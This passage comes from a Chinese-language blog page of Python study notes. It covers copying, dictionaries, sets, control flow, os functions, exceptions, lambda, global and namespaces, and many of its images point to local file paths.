data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201108143559797.png\" alt=\"image-20201108143559797\"></strong></p>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201108143734172.png\" alt=\"image-20201108143734172\"></strong></p>\n<h2 id=\"相关模块-2\"><a class=\"markdownIt-Anchor\" href=\"#相关模块-2\">#</a> <strong>相关模块</strong></h2>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201108144340086.png\" alt=\"image-20201108144340086\"></strong></p>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201108164946765.png\" alt=\"image-20201108164946765\"></strong></p>\n<h2 id=\"浅拷贝和深拷贝\"><a class=\"markdownIt-Anchor\" href=\"#浅拷贝和深拷贝\">#</a> <strong>浅拷贝和深拷贝</strong></h2>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">直接赋值：其实就是对象的引用（别名）。</span><br><span class=\"line\"></span><br><span class=\"line\">浅拷贝(copy)：拷贝父对象，不会拷贝对象的内部的子对象。</span><br><span class=\"line\"></span><br><span class=\"line\">深拷贝(deepcopy)： copy 模块的 deepcopy 方法，完全拷贝了父对象及其子对象。</span><br></pre></td></tr></table></figure>\n<p><strong>浅拷贝</strong></p>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201108165303528.png\" alt=\"image-20201108165303528\"></strong></p>\n<p><strong>深拷贝需要引入 copy 模块</strong></p>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201108165433607.png\" alt=\"image-20201108165433607\"></strong></p>\n<h2 id=\"映射类型字典\"><a class=\"markdownIt-Anchor\" href=\"#映射类型字典\">#</a> <strong>映射类型：字典</strong></h2>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">字典是另一种可变容器模型，且可存储任意类型对象。</span><br><span class=\"line\">第 1 个元素是字典的键，第 2 个元素是字典中的值。</span><br><span class=\"line\"></span><br><span class=\"line\">字典的每个键值 key&#x3D;&gt;value 对用冒号 : 分割，每个键值对之间用逗号 , 分割，整个字典包括在花括号 &#123;&#125; 中 ,格式如下所示：</span><br><span class=\"line\"></span><br><span class=\"line\">d &#x3D; &#123;key1 : value1, key2 : value2 &#125;</span><br></pre></td></tr></table></figure>\n<p><strong>可直接</strong></p>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201108165949714.png\" alt=\"image-20201108165949714\"></strong></p>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201108170457563.png\" alt=\"image-20201108170457563\"></strong></p>\n<p><strong>也可以用工厂函数 dict 创建字典</strong></p>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201108170119982.png\" alt=\"image-20201108170119982\"></strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">可以用一个很方便的内建方法 fromkeys() 来创建一个“默认”字典，字典中</span><br><span class=\"line\">元素具有相同的值 （如果没有给出， 默认为 None）：</span><br></pre></td></tr></table></figure>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201108170308120.png\" alt=\"image-20201108170308120\"></strong></p>\n<p><strong>访问字典中的值</strong></p>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201108170614048.png\" alt=\"image-20201108170614048\"></strong></p>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201108170857435.png\" alt=\"image-20201108170857435\"></strong></p>\n<h2 id=\"映射类型相关的函数\"><a class=\"markdownIt-Anchor\" href=\"#映射类型相关的函数\">#</a> <strong>映射类型相关的函数</strong></h2>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201108171657548.png\" alt=\"image-20201108171657548\"></strong></p>\n<p><strong>a=dict(x=1,y=2)</strong></p>\n<p><strong>顺序是乱的</strong></p>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201108171818778.png\" alt=\"image-20201108171818778\"></strong></p>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201108172146325.png\" alt=\"image-20201108172146325\"></strong></p>\n<h2 id=\"dict\"><a class=\"markdownIt-Anchor\" href=\"#dict\">#</a> <strong>dict.*()</strong></h2>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1\tdict.clear()</span><br><span class=\"line\">删除字典内所有元素</span><br><span class=\"line\">2\tdict.copy()</span><br><span class=\"line\">返回一个字典的浅复制</span><br><span class=\"line\">3\tdict.fromkeys(seq[, val])</span><br><span class=\"line\">创建一个新字典，以序列 seq 中元素做字典的键，val 为字典所有键对应的初始值</span><br><span class=\"line\">4\tdict.get(key, default&#x3D;None)</span><br><span class=\"line\">返回指定键的值，如果值不在字典中返回default值</span><br><span class=\"line\">5\tdict.has_key(key)</span><br><span class=\"line\">如果键在字典dict里返回true，否则返回false</span><br><span class=\"line\">6\tdict.items()</span><br><span class=\"line\">以列表返回可遍历的(键, 值) 元组数组</span><br><span class=\"line\">7\tdict.keys()</span><br><span class=\"line\">以列表返回一个字典所有的键</span><br><span class=\"line\">8\tdict.setdefault(key, default&#x3D;None)</span><br><span class=\"line\">和get()类似, 但如果键不存在于字典中，将会添加键并将值设为default</span><br><span class=\"line\">9\tdict.update(dict2)</span><br><span class=\"line\">把字典dict2的键&#x2F;值对更新到dict里</span><br><span class=\"line\">10\tdict.values()</span><br><span class=\"line\">以列表返回字典中的所有值</span><br><span class=\"line\">11\tpop(key[,default])</span><br><span class=\"line\">删除字典给定键 key 所对应的值，返回值为被删除的值。key值必须给出。 否则，返回default值。</span><br><span class=\"line\">12\tpopitem()</span><br><span class=\"line\">返回并删除字典中的最后一对键和值。</span><br></pre></td></tr></table></figure>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201108173115716.png\" alt=\"image-20201108173115716\"></strong></p>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201108173424551.png\" alt=\"image-20201108173424551\"></strong></p>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201108174029827.png\" alt=\"image-20201108174029827\"></strong></p>\n<h2 id=\"set和frozenset\"><a class=\"markdownIt-Anchor\" href=\"#set和frozenset\">#</a> <strong>set 和 frozenset</strong></h2>\n<p><strong>如何创建集合类型和给集合赋值</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">set(可变集合)与frozenset(不可变集合)的区别：</span><br><span class=\"line\">set无序排序且不重复，是可变的，有add（），remove（）等方法。既然是可变的，所以它不存在哈希值。基本功能包括关系测试和消除重复元素. 集合对象还支持union(联合), intersection(交集), difference(差集)和sysmmetric difference(对称差集)等数学运算.</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">frozenset是冻结的集合，它是不可变的，存在哈希值，好处是它可以作为字典的key，也可以作为其它集合的元素。缺点是一旦创建便不能更改，没有add，remove方法。</span><br></pre></td></tr></table></figure>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201108191142034.png\" alt=\"image-20201108191142034\"></strong></p>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201108191316221.png\" alt=\"image-20201108191316221\"></strong></p>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201108191545218.png\" alt=\"image-20201108191545218\"></strong></p>\n<p><strong>清除 del</strong></p>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201108191648687.png\" alt=\"image-20201108191648687\"></strong></p>\n<p><strong>集合类型操作符（所有的集合类型）</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1．联合（|）  并集   s | t</span><br><span class=\"line\">2．交集（&amp;） s &amp; t</span><br><span class=\"line\">3．差补&#x2F;相对补集（–） s - t</span><br><span class=\"line\">4．对称差分（^）   s ^ t</span><br></pre></td></tr></table></figure>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201108192337063.png\" alt=\"image-20201108192337063\"></strong></p>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201108192354662.png\" alt=\"image-20201108192354662\"></strong></p>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201108192406467.png\" alt=\"image-20201108192406467\"></strong></p>\n<h2 id=\"条件语句-2\"><a class=\"markdownIt-Anchor\" href=\"#条件语句-2\">#</a> <strong>条件语句</strong></h2>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201108203026167.png\" alt=\"image-20201108203026167\"></strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if 判断条件：</span><br><span class=\"line\">    执行语句……</span><br><span class=\"line\">else：</span><br><span class=\"line\">    执行语句……</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if 判断条件1:</span><br><span class=\"line\">    执行语句1……</span><br><span class=\"line\">elif 判断条件2:</span><br><span class=\"line\">    执行语句2……</span><br><span class=\"line\">elif 判断条件3:</span><br><span class=\"line\">    执行语句3……</span><br><span class=\"line\">else:</span><br><span class=\"line\">    执行语句4……</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">while 语句</span><br><span class=\"line\"></span><br><span class=\"line\">while 条件():</span><br><span class=\"line\">  条件满足时,做的事情1</span><br><span class=\"line\">  条件满足时,做的事情2</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">while True循环语句：（死循环）</span><br><span class=\"line\">采用该语句的核心思想是如果出现错误的话，可以继续循环。</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">for循环语句</span><br><span class=\"line\">for循环使用的语法:</span><br><span class=\"line\">for 变量 in 序列:</span><br><span class=\"line\">    循环要执行的动作</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">range 语句</span><br><span class=\"line\">range(start, stop[, step])</span><br><span class=\"line\">range(0,30,5)  [0,5,10,15,20]</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">break语句</span><br><span class=\"line\">在语句块执行过程中终止循环，并且跳出整个循环</span><br><span class=\"line\">continue</span><br><span class=\"line\">语句在语句块执行过程中终止当前循环，跳出该次循环，执行下一次循环。</span><br><span class=\"line\">pass语句</span><br><span class=\"line\">是空语句，是为了保持程序结构的完整性</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">try:</span><br><span class=\"line\">  可能产生异常的代码块</span><br><span class=\"line\">except [ (Error1, Error2, ... ) [as e] ]:</span><br><span class=\"line\">  处理异常的代码块1</span><br><span class=\"line\">except [ (Error3, Error4, ... ) [as e] ]:</span><br><span class=\"line\">  处理异常的代码块2</span><br><span class=\"line\">except [Exception]:</span><br><span class=\"line\">  处理其它异常</span><br></pre></td></tr></table></figure>\n<h2 id=\"与序列相关的内建函数\"><a class=\"markdownIt-Anchor\" href=\"#与序列相关的内建函数\">#</a> <strong>与序列相关的内建函数</strong></h2>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201108205005894.png\" alt=\"image-20201108205005894\"></strong></p>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201108205037907.png\" alt=\"image-20201108205037907\"></strong></p>\n<h2 id=\"矩阵样例\"><a class=\"markdownIt-Anchor\" href=\"#矩阵样例\">#</a> <strong>矩阵样例</strong></h2>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201108210152217.png\" alt=\"image-20201108210152217\"></strong></p>\n<h2 id=\"os-模块的文件目录访问函数\"><a class=\"markdownIt-Anchor\" href=\"#os-模块的文件目录访问函数\">#</a> <strong>os 模块的文件 / 目录访问函数</strong></h2>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201109101533347.png\" alt=\"image-20201109101533347\"></strong></p>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201109101540515.png\" alt=\"image-20201109101540515\"></strong></p>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201109101546504.png\" alt=\"image-20201109101546504\"></strong></p>\n<h2 id=\"ospath模块中的路径名访问函数\"><a class=\"markdownIt-Anchor\" href=\"#ospath模块中的路径名访问函数\">#</a> <strong>os.path 模块中的路径名访问函数</strong></h2>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201109101616641.png\" alt=\"image-20201109101616641\"></strong></p>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201109101622143.png\" alt=\"image-20201109101622143\"></strong></p>\n<h2 id=\"相关模块-3\"><a class=\"markdownIt-Anchor\" href=\"#相关模块-3\">#</a> <strong>相关模块</strong></h2>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201109103410350.png\" alt=\"image-20201109103410350\"></strong></p>\n<h2 id=\"python-中的异常错误\"><a class=\"markdownIt-Anchor\" href=\"#python-中的异常错误\">#</a> <strong>python 中的异常错误</strong></h2>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1．NameError：尝试访问一个未申明的变量</span><br><span class=\"line\">2．ZeroDivisionError：除数为零   1&#x2F;0</span><br><span class=\"line\">3．SyntaxError：Python 解释器语法错误  for</span><br><span class=\"line\">4．IndexError：请求的索引超出序列范围  a&#x3D;[]  a[0]</span><br><span class=\"line\">5．KeyError：请求一个不存在的字典关键字 </span><br><span class=\"line\">a&#x3D;&#123;&#39;host&#39;:&#39;earth&#39;&#125;   print a[server&#39;&#39;]</span><br><span class=\"line\">6．IOError：输入&#x2F;输出错误 f&#x3D;open(&quot;blash&quot;)</span><br><span class=\"line\">7．AttributeError：尝试访问未知的对象属性 class</span><br></pre></td></tr></table></figure>\n<h2 id=\"try-except语句\"><a class=\"markdownIt-Anchor\" href=\"#try-except语句\">#</a> <strong>try-except 语句</strong></h2>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201109105052905.png\" alt=\"image-20201109105052905\"></strong></p>\n<h2 id=\"raise语句\"><a class=\"markdownIt-Anchor\" href=\"#raise语句\">#</a> <strong>raise 语句</strong></h2>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201109163221607.png\" alt=\"image-20201109163221607\"></strong></p>\n<h2 id=\"python-内建异常\"><a class=\"markdownIt-Anchor\" href=\"#python-内建异常\">#</a> <strong>python 内建异常</strong></h2>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">异 常 名 称</span><br><span class=\"line\">描 述</span><br><span class=\"line\">BaseExceptiona  所有异常的基类</span><br><span class=\"line\">SystemExitbpython 解释器请求退出</span><br><span class=\"line\">KeyboardInterruptc 用户中断执行（通常是输入^C）</span><br><span class=\"line\">Exceptiond 常规错误的基类</span><br><span class=\"line\">StopIterationn 迭代器没有更多的值</span><br><span class=\"line\">GeneratorExita</span><br><span class=\"line\">生成器（generator）发生异常来通知退出</span><br><span class=\"line\">SystemExith Python 解释器请求退出</span><br><span class=\"line\">StandardErrorg 所有的内建标准异常的基类</span><br><span class=\"line\">ArithmeticErrord 所有数值计算错误的基类</span><br><span class=\"line\">FloatingPointErrord 浮点计算错误</span><br><span class=\"line\">OverflowError 数值运算超出最大限制</span><br><span class=\"line\">ZeroDivisionError 除（或取模）零（所有数据类型）AssertionErrord 断言语句失败</span><br><span class=\"line\">AttributeError 对象没有这个属性</span><br><span class=\"line\">EOFError 没有内建输入，到达 EOF 标记</span><br><span class=\"line\">EnvironmentErrord 操作系统错误的基类</span><br><span class=\"line\">IOError 输入&#x2F;输出操作失败</span><br><span class=\"line\">OSErrord 操作系统错误</span><br><span class=\"line\">WindowsErrorh Windows 系统调用失败</span><br><span class=\"line\">ImportError 导入模块&#x2F;对象失败</span><br><span class=\"line\">KeyboardInterruptf 用户中断执行（通常是输入^C）</span><br><span class=\"line\">LookupErrord 无效数据查询的基类</span><br><span class=\"line\">IndexError 序列中没有没有此索引（index）</span><br><span class=\"line\">KeyError 映射中没有这个键</span><br><span class=\"line\">MemoryError 内存溢出错误（对于 Python 解释器不是致命的）</span><br><span class=\"line\">NameError 未声明&#x2F;初始化对象（没有属性）</span><br><span class=\"line\">UnboundLocalErrorh 访问未初始化的本地变量</span><br><span class=\"line\">ReferenceErrore 弱引用（Weak reference）试图访问已经垃圾回收了的对象</span><br><span class=\"line\">RuntimeError 一般的运行时错误</span><br><span class=\"line\">NotImplementedErrord 尚未实现的方法</span><br><span class=\"line\">SyntaxError Python 语法错误</span><br><span class=\"line\">IndentationErrorg 缩进错误</span><br><span class=\"line\">TabErrorg Tab 和空格混用</span><br><span class=\"line\">SystemError 一般的解释器系统错误</span><br><span class=\"line\">TypeError 对类型无效的操作</span><br><span class=\"line\">ValueError 传入无效的参数</span><br><span class=\"line\">UnicodeErrorh Unicode 相关的错误</span><br><span class=\"line\">UnicodeDecodeErrori Unicode 解码时的错误</span><br><span class=\"line\">UnicodeEncodeErrori Unicode 编码时错误</span><br><span class=\"line\">UnicodeTranslateErrorf Unicode 转换时错误</span><br><span class=\"line\">Warningj 警告的基类</span><br><span class=\"line\">DeprecationWarningj 关于被弃用的特征的警告</span><br><span class=\"line\">FutureWarningi 关于构造将来语义会有改变的警告</span><br><span class=\"line\">OverflowWarningk 旧的关于自动提升为长整型（long）的警告</span><br><span class=\"line\">PendingDeprecationWarningi 关于特性将会被废弃的警告</span><br><span class=\"line\">RuntimeWarningj 可疑的运行时行为（runtime behavior）的警告</span><br><span class=\"line\">SyntaxWarningj 可疑的语法的警告</span><br><span class=\"line\">UserWarningj 用户代码生成的警告</span><br></pre></td></tr></table></figure>\n<h2 id=\"operator模块\"><a class=\"markdownIt-Anchor\" href=\"#operator模块\">#</a> <strong>operator 模块</strong></h2>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">operator模块输出一系列对应Python内部操作符的函数。例如：operator.add(x, y)等价于表达式x+y。许多函数的名称都被一些特定的方法使用，没有下划线加持。为了向下兼容，它们中的许多都保留着由双下划线的变体。那些不具备双下划线的变体是为了使表达更清晰。</span><br><span class=\"line\">这些函数在各种函数目录里扮演者对相比较、逻辑操作、数学运算以及序列操作等角色。</span><br></pre></td></tr></table></figure>\n<h2 id=\"python代码中的funcargskwargs\"><a class=\"markdownIt-Anchor\" href=\"#python代码中的funcargskwargs\">#</a> <strong>python 代码中的 func (<em>args,kwargs)</em></strong>*</h2>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">这是Python函数可变参数 args及kwargs</span><br><span class=\"line\"></span><br><span class=\"line\">*args表示任何多个无名参数，它是一个tuple</span><br><span class=\"line\"></span><br><span class=\"line\">**kwargs表示关键字参数，它是一个dic</span><br></pre></td></tr></table></figure>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201110144620227.png\" alt=\"image-20201110144620227\"></strong></p>\n<p><strong>运行结果</strong></p>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201110144637303.png\" alt=\"image-20201110144637303\"></strong></p>\n<h2 id=\"lambda\"><a class=\"markdownIt-Anchor\" href=\"#lambda\">#</a> <strong>lambda</strong></h2>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201110160627942.png\" alt=\"image-20201110160627942\"></strong></p>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201110160804981.png\" alt=\"image-20201110160804981\"></strong></p>\n<p><em><strong>x 元组      x 字典</strong></em> *</p>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201110160953805.png\" alt=\"image-20201110160953805\"></strong></p>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201110172746858.png\" alt=\"image-20201110172746858\"></strong></p>\n<h2 id=\"global用法\"><a class=\"markdownIt-Anchor\" href=\"#global用法\">#</a> <strong>global 用法</strong></h2>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Python中定义函数时，若想在函数内部对函数外的变量进行操作，就需要在函数内部声明其为global。</span><br></pre></td></tr></table></figure>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201110193303076.png\" alt=\"image-20201110193303076\"></strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">加了global，则可以在函数内部对函数外的对象进行操作了，也可以改变它的值了</span><br></pre></td></tr></table></figure>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201110193353117.png\" alt=\"image-20201110193353117\"></strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">global需要在函数内部声明，若在函数外声明，则函数依然无法操作x</span><br></pre></td></tr></table></figure>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201110193517358.png\" alt=\"image-20201110193517358\"></strong></p>\n<h2 id=\"python-名称空间与作用域\"><a class=\"markdownIt-Anchor\" href=\"#python-名称空间与作用域\">#</a> <strong>python 名称空间与作用域</strong></h2>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Python 的名称（Name）是对象的一个标识（Identifier）。我们知道，在 Python 里面一切皆对象，名称就是用来引用对象的。说得有点玄乎，我们以例子说明。</span><br><span class=\"line\"></span><br><span class=\"line\">例如，在a &#x3D; 2这个语句中，2是个存储在内存中的一个对象，名称a则会引用2这个对象，“引用”的含义是指可以通过名称a来使用2这个对象。我们可以使用id()函数来获取对象的地址。</span><br><span class=\"line\">a &#x3D; 2</span><br><span class=\"line\">print(id(2))  &#x3D;&gt; 43547988</span><br><span class=\"line\">print(id(a))  &#x3D;&gt; 43547988</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span 